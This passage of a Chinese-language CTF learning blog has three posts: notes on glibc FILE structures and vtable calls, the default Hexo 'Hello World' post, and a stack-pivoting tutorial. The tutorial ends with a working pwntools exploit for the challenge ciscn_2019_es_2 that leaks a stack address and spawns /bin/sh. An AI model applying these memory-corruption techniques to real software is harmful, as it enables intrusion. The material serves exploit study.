class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE &#123;</span><br><span class="line">  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;   /* Current read pointer */</span><br><span class="line">  char* _IO_read_end;   /* End of get area. */</span><br><span class="line">  char* _IO_read_base;  /* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base; /* Start of put area. */</span><br><span class="line">  char* _IO_write_ptr;  /* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;  /* End of put area. */</span><br><span class="line">  char* _IO_buf_base;   /* Start of reserve area. */</span><br><span class="line">  char* _IO_buf_end;    /* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;</span><br><span class="line"></span><br><span class="line">  int _fileno;</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;</span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">&#125;;</span><br><span class="line">struct _IO_FILE_complete</span><br><span class="line">&#123;</span><br><span class="line">  struct _IO_FILE _file;</span><br><span class="line">#endif</span><br><span class="line">#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"># if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">  /* Wide character stream stuff.  */</span><br><span class="line">  struct _IO_codecvt *_codecvt;</span><br><span class="line">  struct _IO_wide_data *_wide_data;</span><br><span class="line">  struct _IO_FILE *_freeres_list;</span><br><span class="line">  void *_freeres_buf;</span><br><span class="line"># else</span><br><span class="line">  void *__pad1;</span><br><span class="line">  void *__pad2;</span><br><span class="line">  void *__pad3;</span><br><span class="line">  void *__pad4;</span><br><span class="line"></span><br><span class="line">  size_t __pad5;</span><br><span class="line">  int _mode;</span><br><span class="line">  /* Make sure we don&#x27;t get into trouble again.  */</span><br><span class="line">  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];</span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p>
+<p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。</p>
+<p>我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure>
+
+<p>但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p>
+<p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针  （挺重要的一个知识点）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">void * funcs[] = &#123;</span><br><span class="line">   1 NULL, // &quot;extra word&quot;</span><br><span class="line">   2 NULL, // DUMMY</span><br><span class="line">   3 exit, // finish</span><br><span class="line">   4 NULL, // overflow</span><br><span class="line">   5 NULL, // underflow</span><br><span class="line">   6 NULL, // uflow</span><br><span class="line">   7 NULL, // pbackfail</span><br><span class="line">   </span><br><span class="line">   8 NULL, // xsputn  #printf</span><br><span class="line">   9 NULL, // xsgetn</span><br><span class="line">   10 NULL, // seekoff</span><br><span class="line">   11 NULL, // seekpos</span><br><span class="line">   12 NULL, // setbuf</span><br><span class="line">   13 NULL, // sync</span><br><span class="line">   14 NULL, // doallocate</span><br><span class="line">   15 NULL, // read</span><br><span class="line">   16 NULL, // write</span><br><span class="line">   17 NULL, // seek</span><br><span class="line">   18 pwn,  // close</span><br><span class="line">   19 NULL, // stat</span><br><span class="line">   20 NULL, // showmanyc</span><br><span class="line">   21 NULL, // imbue</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>buffer 存放读取数据的缓冲区。</li>
+<li>size：指定每个记录的长度。</li>
+<li>count： 指定记录的个数。</li>
+<li>stream：目标文件流。</li>
+<li>返回值：返回读取到数据缓冲区中的记录个数</li>
+</ul>
+<p>fread 的代码位于 / libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (buf, size, count, fp)</span><br><span class="line">     void *buf;</span><br><span class="line">     _IO_size_t size;</span><br><span class="line">     _IO_size_t count;</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 在_IO_sgetn 函数中会调用_IO_XSGETN，而_IO_XSGETN 是_IO_FILE_plus.vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (fp, data, n)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     void *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  return _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 在默认情况下函数指针是指向_IO_file_xsgetn 函数的，  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_buf_base</span><br><span class="line">        &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">      &#123;</span><br><span class="line">        if (__underflow (fp) == EOF)</span><br><span class="line">      break;</span><br><span class="line"></span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li>
+<li>size: 要写入内容的单字节数;</li>
+<li>count: 要进行写入 size 字节的数据项的个数;</li>
+<li>stream: 目标文件指针;</li>
+<li>返回值：实际写入的数据项个数 count。</li>
+</ul>
+<p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p>
+<p>根据前面对_IO_FILE_plus 的介绍，可知_IO_XSPUTN 位于_IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">written = _IO_sputn (fp, (const char *) buf, request);</span><br></pre></td></tr></table></figure>
+
+<p> 在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Next flush the (full) buffer. */</span><br><span class="line">     if (_IO_OVERFLOW (f, EOF) == EOF)</span><br></pre></td></tr></table></figure>
+
+<p> _IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (ch == EOF)</span><br><span class="line">    return _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */</span><br><span class="line">    if (_IO_do_flush (f) == EOF)</span><br><span class="line">      return EOF;</span><br></pre></td></tr></table></figure>
+
+<p> 在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p>
+<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>fopen 在标准 IO 库中用于打开文件，函数原型如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FILE *fopen(char *filename, *type);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>filename: 目标文件的路径</li>
+<li>type: 打开方式的类型</li>
+<li>返回值: 返回一个文件指针</li>
+</ul>
+<p>在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程</p>
+<p>首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</span><br></pre></td></tr></table></figure>
+
+<p> 之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">_IO_file_init (&amp;new_f-&gt;fp);</span><br></pre></td></tr></table></figure>
+
+<p> 在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_link_in (fp)</span><br><span class="line">     struct _IO_FILE_plus *fp;</span><br><span class="line">&#123;</span><br><span class="line">    if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)</span><br><span class="line">    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br></pre></td></tr></table></figure>
+
+<p>总结一下 fopen 的操作是</p>
+<ul>
+<li>使用 malloc 分配 FILE 结构</li>
+<li>设置 FILE 结构的 vtable</li>
+<li> 初始化分配的 FILE 结构</li>
+<li>将初始化的 FILE 结构链入 FILE 结构链表中</li>
+<li>调用系统调用打开文件</li>
+</ul>
+<h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fclose(FILE *stream)</span><br></pre></td></tr></table></figure>
+
+<p> 功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p>
+<p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure>
+
+<p> 之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure>
+
+<p> 最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure>
+
+<h2 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf/puts"></a>printf/puts</h2><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p>
+<p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p>
+<p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vfprintf+11</span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>边刷刷题看看wiki，有点想学web了（感觉有点悬，pwn都学不明白）</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/08/01/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/01/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-08-01 15:51:56" itemprop="dateCreated datePublished" datetime="2022-08-01T15:51:56+08:00">2022-08-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-01-16 13:14:13" itemprop="dateModified" datetime="2022-01-16T13:14:13+08:00">2022-01-16</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="post-title-link" itemprop="url">栈迁移</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-04-18 00:28:53 / Modified: 12:23:13" itemprop="dateCreated datePublished" datetime="2022-04-18T00:28:53+08:00">2022-04-18</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><h2 id="什么是栈迁移-适用的地方"><a href="#什么是栈迁移-适用的地方" class="headerlink" title="什么是栈迁移(适用的地方)"></a>什么是栈迁移(适用的地方)</h2><p>栈迁移主要是为了解决栈溢出空间大小不足的问题</p>
+<p>简单的说：就是通过修改ebp指针来修改栈帧的位置和大小</p>
+<h2 id="栈迁移的实现"><a href="#栈迁移的实现" class="headerlink" title="栈迁移的实现"></a>栈迁移的实现</h2><p>通过将ebp覆盖成我们构造的fake_ebp ，然后利用leave_ret这个gadget将esp劫持到fake_ebp的地址上。</p>
+<h4 id="leave-ret"><a href="#leave-ret" class="headerlink" title="leave_ret:"></a>leave_ret:</h4><p>leave:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp;</span><br><span class="line">pop ebp;</span><br></pre></td></tr></table></figure>
+
+<p>ret:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eip</span><br></pre></td></tr></table></figure>
+
+<p>假如，有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这个样子：</p>
+<p>当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入</p>
+<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/1.png"></p>
+<p>在call调用之后，会有下面的指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>当我们挨个去执行的时候会出现这样的情况</p>
+<p>执行完mov esp,ebp后的情况：</p>
+<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/2.png"></p>
+<p>pop ebp:(别忘了执行完pop ebp后esp会自动减一个内存单位)</p>
+<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/3.png"></p>
+<p>这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 fake ebp1 的地址处</p>
+<p>构造的内容主要是把 fake ebp1 处写成 fake ebp2 的地址</p>
+<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/4.png"></p>
+<p>read 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样</p>
+<p>首先是 mov esp,ebp 执行完成后效果如下：</p>
+<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/5.png"></p>
+<p>然后是 pop ebp，执行完成后：</p>
+<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/6-1-1024x568.png"></p>
+<p>此时再执行 ret 命令，他就会执行我们构造在 bss 段后者 data 段的那个函数</p>
+<p>这样我们就成功的将栈迁移到了bss段</p>
+<p>例题：ciscn_2019_es_2</p>
+<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115704991.png" alt="image-20220418115704991"></p>
+<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115642138.png" alt="image-20220418115642138"></p>
+<p>从上图可以看出该题可以进行栈溢出，但是由于溢出的长度不够所以我们选择进行栈迁移</p>
+<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115858569.png" alt="image-20220418115858569"></p>
+<p>通过调试可以知道该题可以泄露栈的地址，ebp上存的地址距离ebp为0x10，因此可以将构造的system(“/bin/sh”),写入栈中来执行</p>
+<p>该题的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dgb</span>():</span></span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line">io=process(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">sys_addr=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x80484b8</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">leak_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#dgb()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">payload1=(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys_addr)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(leak_addr-<span class="number">0x28</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1+=p32(leak_addr-<span class="number">0x38</span>)+p32(leave_ret)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
